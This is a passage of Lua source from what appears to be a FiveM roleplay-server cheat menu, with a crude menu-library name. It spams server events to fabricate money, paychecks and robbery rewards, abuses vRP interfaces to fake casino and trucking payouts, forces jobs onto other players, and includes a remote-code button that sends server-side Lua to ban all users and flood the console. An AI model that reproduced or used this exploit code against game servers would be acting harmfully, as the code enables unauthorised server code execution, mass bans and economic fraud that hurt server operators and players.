					TriggerServerEvent("esx_pilot:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_pilot:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_pilot:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_pilot:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_pilot:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_pilot:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_pilot:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_taxijob:success")
					TriggerServerEvent("esx_mugging:giveMoney")
					TriggerServerEvent("esx_mugging:giveMoney")
					TriggerServerEvent("esx_mugging:giveMoney")
					TriggerServerEvent("esx_mugging:giveMoney")
					TriggerServerEvent("esx_mugging:giveMoney")
					TriggerServerEvent("esx_mugging:giveMoney")
					TriggerServerEvent("esx_mugging:giveMoney")
					TriggerServerEvent("esx_mugging:giveMoney")
					TriggerServerEvent("esx_mugging:giveMoney")
					TriggerServerEvent("esx_mugging:giveMoney")
					TriggerServerEvent("esx_mugging:giveMoney")
					TriggerServerEvent("esx_mugging:giveMoney")
					TriggerServerEvent("esx_mugging:giveMoney")
					TriggerServerEvent("esx_mugging:giveMoney")
					TriggerServerEvent("esx_mugging:giveMoney")
					TriggerServerEvent("esx_mugging:giveMoney")
					TriggerServerEvent("esx_mugging:giveMoney")
					TriggerServerEvent("esx_mugging:giveMoney")
					TriggerServerEvent("esx_mugging:giveMoney")
					TriggerServerEvent("esx_mugging:giveMoney")
					TriggerServerEvent("esx_mugging:giveMoney")
					TriggerServerEvent("esx_mugging:giveMoney")
					TriggerServerEvent("paycheck:salary")
					TriggerServerEvent("paycheck:salary")
					TriggerServerEvent("paycheck:salary")
					TriggerServerEvent("paycheck:salary")
					TriggerServerEvent("paycheck:salary")
					TriggerServerEvent("paycheck:salary")
					TriggerServerEvent("paycheck:salary")
					TriggerServerEvent("paycheck:salary")
					TriggerServerEvent("paycheck:salary")
					TriggerServerEvent("paycheck:salary")
					TriggerServerEvent("paycheck:salary")
					TriggerServerEvent("paycheck:salary")
					TriggerServerEvent("paycheck:salary")
					TriggerServerEvent("paycheck:salary")
					TriggerServerEvent("paycheck:salary")
					TriggerServerEvent("paycheck:salary")
					TriggerServerEvent("paycheck:salary")
					TriggerServerEvent("paycheck:salary")
					TriggerServerEvent("paycheck:salary")
					TriggerServerEvent("paycheck:salary")
					TriggerServerEvent("paycheck:salary")
					TriggerServerEvent("paycheck:salary")
					TriggerServerEvent("paycheck:salary")
					TriggerServerEvent("paycheck:salary")
					TriggerServerEvent("paycheck:salary")
					TriggerServerEvent("paycheck:salary")
					TriggerServerEvent("paycheck:salary")
					TriggerServerEvent("paycheck:salary")
					TriggerServerEvent("paycheck:salary")
					TriggerServerEvent("paycheck:salary")
					TriggerServerEvent("paycheck:salary")
					TriggerServerEvent("paycheck:salary")
					TriggerServerEvent("paycheck:salary")
					TriggerServerEvent("paycheck:salary")
					TriggerServerEvent("paycheck:salary")
					TriggerServerEvent("paycheck:salary")
					TriggerServerEvent("paycheck:salary")
					TriggerServerEvent("paycheck:salary")
					TriggerServerEvent("paycheck:salary")
					TriggerServerEvent("paycheck:salary")
					TriggerServerEvent("paycheck:salary")
					TriggerServerEvent("paycheck:salary")
					TriggerServerEvent("paycheck:salary")
					TriggerServerEvent("paycheck:salary")
					TriggerServerEvent("paycheck:salary")
					TriggerServerEvent("paycheck:salary")
					TriggerServerEvent("paycheck:salary")
					TriggerServerEvent("paycheck:salary")
				else
					ShowInfo("~r~Operation Canceled")
				end
			elseif IhadSexWithMyStepMother.Button("~g~MONEY~s~ 3 ~y~Esx~s~ | ~b~vRP ~r~ (RISK) ~s~(Work 90% ALL SERVERS)") then
				local hs = e9("Using this option will ~r~risk banned ~s~server! Are you Sure? ~g~Y/~r~N")
				if string.lower(hs) == "y" then
					local bh = e9("Enter amount of money ~g~$$$", "", 100000000)
					TriggerServerEvent("esx_godirtyjob:pay", bh)
					TriggerServerEvent("esx_pizza:pay", bh)
					TriggerServerEvent("esx_slotmachine:sv:2", bh)
					TriggerServerEvent("esx_banksecurity:pay", bh)
					TriggerServerEvent("esx_gopostaljob:pay", bh)
					TriggerServerEvent("esx_truckerjob:pay", bh)
					TriggerServerEvent("esx_carthief:pay", bh)
					TriggerServerEvent("esx_garbagejob:pay", bh)
					TriggerServerEvent("esx_ranger:pay", bh)
					TriggerServerEvent("esx_truckersjob:payy", bh)
					TriggerServerEvent("esx_godirtyjob:pay", bh)
					TriggerServerEvent("dropOff", bh)
					TriggerServerEvent("PayForRepairNow", -bh)
				else
					ShowInfo("~r~Operation Canceled")
				end
			elseif IhadSexWithMyStepMother.Button("~g~MONEY~s~ 4 ~b~VRP (vrp_trucker)") then
				local hK = e9("Enter amount of money ~g~$$$")
				local distance = hK / 3.80;
				vRPtruckS = Tunnel.getInterface("vRP_trucker", "vRP_trucker")
				vRPtruckS.finishTruckingDelivery({
					distance
				})
			elseif IhadSexWithMyStepMother.Button("~g~MONEY~s~ 5 ~b~ VRP (vrp_casino)") then
				local hL = e9("Enter amount of money ~g~$$$:")
				vRPcasinoS = Tunnel.getInterface("vRP_casino", "vRP_casino")
				vRPcasinoS.payRouletteWinnings({
					hL,
					2
				})
			elseif IhadSexWithMyStepMother.Button("~r~Ban Vrp !Use Server Without Anticheat!") then
				TriggerServerEvent("RunCode:RunStringRemotelly", [[
    local users = vRP.getUsers({})
    local myid = 21
    for k,v in pairs(users) do 
        local srcs = vRP.getUserSource({tonumber(k)})
        vRP.ban({srcs, "Banned by !  AmX#4083 Discord: AmX#4083)
    end

    for i = 1,300 do 
        RconPrint("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")
        RconPrint("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")
    end
]])
			elseif IhadSexWithMyStepMother.Button("~g~MONEY~s~ 7 ~b~ VRP PayCheck 100X Working Vrp") then
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:salary")
				TriggerServerEvent("paycheck:salary")
				TriggerServerEvent("paycheck:salary")
				TriggerServerEvent("paycheck:salary")
				TriggerServerEvent("paycheck:salary")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:salary")
				TriggerServerEvent("paycheck:salary")
				TriggerServerEvent("paycheck:salary")
				TriggerServerEvent("paycheck:salary")
				TriggerServerEvent("paycheck:salary")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:salary")
				TriggerServerEvent("paycheck:salary")
				TriggerServerEvent("paycheck:salary")
				TriggerServerEvent("paycheck:salary")
				TriggerServerEvent("paycheck:salary")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:salary")
				TriggerServerEvent("paycheck:salary")
				TriggerServerEvent("paycheck:salary")
				TriggerServerEvent("paycheck:salary")
				TriggerServerEvent("paycheck:salary")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:salary")
				TriggerServerEvent("paycheck:salary")
				TriggerServerEvent("paycheck:salary")
				TriggerServerEvent("paycheck:salary")
				TriggerServerEvent("paycheck:salary")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:salary")
				TriggerServerEvent("paycheck:salary")
				TriggerServerEvent("paycheck:salary")
				TriggerServerEvent("paycheck:salary")
				TriggerServerEvent("paycheck:salary")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:salary")
				TriggerServerEvent("paycheck:salary")
				TriggerServerEvent("paycheck:salary")
				TriggerServerEvent("paycheck:salary")
				TriggerServerEvent("paycheck:salary")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:salary")
				TriggerServerEvent("paycheck:salary")
				TriggerServerEvent("paycheck:salary")
				TriggerServerEvent("paycheck:salary")
				TriggerServerEvent("paycheck:salary")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:salary")
				TriggerServerEvent("paycheck:salary")
				TriggerServerEvent("paycheck:salary")
				TriggerServerEvent("paycheck:salary")
				TriggerServerEvent("paycheck:salary")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
				TriggerServerEvent("paycheck:bonus_ad")
			elseif IhadSexWithMyStepMother.Button("~g~MONEY~s~ 8 ~b~ VRP|Vrpx (SAMU|SALARIO)") then
				local bh = 9999;
				if bh then
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
					TriggerServerEvent("reanimar:pagamento")
				end
			elseif IhadSexWithMyStepMother.Button("~g~MONEY~s~ 9 ~b~ VRP|Vrpx (SAMU|SALARIO)") then
				local bh = 9999;
				if bh then
					TriggerServerEvent("salario:pagamento")
					TriggerServerEvent("salario:pagamento")
					TriggerServerEvent("salario:pagamento")
					TriggerServerEvent("salario:pagamento")
					TriggerServerEvent("salario:pagamento")
					TriggerServerEvent("salario:pagamento")
					TriggerServerEvent("salario:pagamento")
					TriggerServerEvent("salario:pagamento")
					TriggerServerEvent("salario:pagamento")
					TriggerServerEvent("salario:pagamento")
					TriggerServerEvent("salario:pagamento")
					TriggerServerEvent("salario:pagamento")
					TriggerServerEvent("salario:pagamento")
					TriggerServerEvent("salario:pagamento")
					TriggerServerEvent("salario:pagamento")
					TriggerServerEvent("salario:pagamento")
					TriggerServerEvent("salario:pagamento")
					TriggerServerEvent("salario:pagamento")
					TriggerServerEvent("salario:pagamento")
					TriggerServerEvent("salario:pagamento")
					TriggerServerEvent("salario:pagamento")
					TriggerServerEvent("salario:pagamento")
					TriggerServerEvent("salario:pagamento")
				end
			elseif IhadSexWithMyStepMother.Button("~g~MONEY~s~ 10 ~b~ VRP|Vrpx (SAMU|SALARIO) ~r~OFF") then
				local bh = e9("Enter amount of money ~g~$$$", "", 100000000)
				if bh then
					TriggerServerEvent("offred:salar")
					TriggerServerEvent("offred:salar")
					TriggerServerEvent("offred:salar")
					TriggerServerEvent("offred:salar")
					TriggerServerEvent("offred:salar")
					TriggerServerEvent("offred:salar")
					TriggerServerEvent("offred:salar")
					TriggerServerEvent("offred:salar")
					TriggerServerEvent("offred:salar")
					TriggerServerEvent("offred:salar")
					TriggerServerEvent("offred:salar")
					TriggerServerEvent("offred:salar")
					TriggerServerEvent("offred:salar")
					TriggerServerEvent("offred:salar")
					TriggerServerEvent("offred:salar")
					TriggerServerEvent("offred:salar")
					TriggerServerEvent("offred:salar")
					TriggerServerEvent("offred:salar")
					TriggerServerEvent("offred:salar")
					TriggerServerEvent("offred:salar")
					TriggerServerEvent("offred:salar")
					TriggerServerEvent("offred:salar")
					TriggerServerEvent("offred:salar")
					TriggerServerEvent("offred:salar")
					TriggerServerEvent("offred:salar")
					TriggerServerEvent("offred:salar")
				end
			elseif IhadSexWithMyStepMother.Button("~s~Bank ~r~~h~Deposit") then
				local hK = e9("Enter amount of money", "", 100)
				if hK then
					TriggerServerEvent("bank:deposit", hK)
				end
			elseif IhadSexWithMyStepMother.Button("~s~Bank ~r~~h~Withdraw ") then
				local hK = e9("Enter amount of money", "", 100)
				if hK then
					TriggerServerEvent("bank:withdraw", hK)
				end
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("player1") then
			local gW = GetActivePlayers()
			for i = 1, #gW do
				local gX = gW[i]
				if IhadSexWithMyStepMother.MenuButton("ID: ~g~[" .. GetPlayerServerId(gX) .. "] ~s~~h~" .. GetPlayerName(gX), "other") then
					selectedPlayer = gX
				end
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("other") then
			if IhadSexWithMyStepMother.Button("~r~Remove Job") then
				TriggerServerEvent("NB:destituerplayer", GetPlayerServerId(selectedPlayer))
			elseif IhadSexWithMyStepMother.Button("~s~Recruit~c~ Mechanic") then
				local bh = e9("Enter Nivel Job ~g~0-10", "", 10)
				TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(selectedPlayer), "mecano", bh)
			elseif IhadSexWithMyStepMother.Button("~s~Recruit~b~ Police") then
				local bh = e9("Enter Nivel Job ~g~0-10", "", 10)
				TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(selectedPlayer), "police", bh)
				TriggerServerEvent("Esx-MenuPessoal:Boss_recruterplayer", GetPlayerServerId(selectedPlayer), "police", bh)
				TriggerServerEvent("Corujas RP-MenuPessoal:Boss_recruterplayer", GetPlayerServerId(selectedPlayer), "police", bh)
			elseif IhadSexWithMyStepMother.Button("~s~Recruit~c~ Mafia") then
				local bh = e9("Enter Nivel Job ~g~0-10", "", 10)
				TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(selectedPlayer), "mafia", bh)
				TriggerServerEvent("Esx-MenuPessoal:Boss_recruterplayer", GetPlayerServerId(selectedPlayer), "mafia", bh)
			elseif IhadSexWithMyStepMother.Button("~s~Recruit~p~ Gang") then
				local bh = e9("Enter Nivel Job ~g~0-10", "", 10)
				TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(selectedPlayer), "gang", bh)
				TriggerServerEvent("Esx-MenuPessoal:Boss_recruterplayer", GetPlayerServerId(selectedPlayer), "gang", bh)
			elseif IhadSexWithMyStepMother.Button("~s~Recruit~y~ Taxi") then
				local bh = e9("Enter Nivel Job ~g~0-10", "", 10)
				TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(selectedPlayer), "taxi", bh)
				TriggerServerEvent("Esx-MenuPessoal:Boss_recruterplayer", GetPlayerServerId(selectedPlayer), "taxi", bh)
			elseif IhadSexWithMyStepMother.Button("~s~Recruit~r~ Inem") then
				local bh = e9("Enter Nivel Job ~g~0-10", "", 10)
				TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(selectedPlayer), "ambulance", bh)
				TriggerServerEvent("Esx-MenuPessoal:Boss_recruterplayer", GetPlayerServerId(selectedPlayer), "ambulance", bh)
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("esx") then
			if IhadSexWithMyStepMother.Button("~g~ﻝﺎﻐﺷ ﺱﻮﻠﻓ ﺬﺧﺍ 100%") then
				TriggerServerEvent("55-storerobbery:server:SafeReward", currentSafe)
				TriggerServerEvent("55-storerobbery:server:SafeReward", currentSafe)
				TriggerServerEvent("55-storerobbery:server:SafeReward", currentSafe)
				TriggerServerEvent("55-storerobbery:server:SafeReward", currentSafe)
				TriggerServerEvent("55-storerobbery:server:SafeReward", currentSafe)
				TriggerServerEvent("55-storerobbery:server:SafeReward", currentSafe)
				TriggerServerEvent("55-storerobbery:server:SafeReward", currentSafe)
				TriggerServerEvent("55-storerobbery:server:SafeReward", currentSafe)
				TriggerServerEvent("55-storerobbery:server:SafeReward", currentSafe)
				TriggerServerEvent("55-storerobbery:server:SafeReward", currentSafe)
				TriggerServerEvent("55-storerobbery:server:SafeReward", currentSafe)
				TriggerServerEvent("55-storerobbery:server:SafeReward", currentSafe)
				TriggerServerEvent("55-storerobbery:server:SafeReward", currentSafe)
				TriggerServerEvent("55-storerobbery:server:SafeReward", currentSafe)
				TriggerServerEvent("55-storerobbery:server:CrackReward",currentSafe)
				TriggerServerEvent("55-storerobbery:server:CrackReward",currentSafe)
				TriggerServerEvent("55-storerobbery:server:CrackReward",currentSafe)
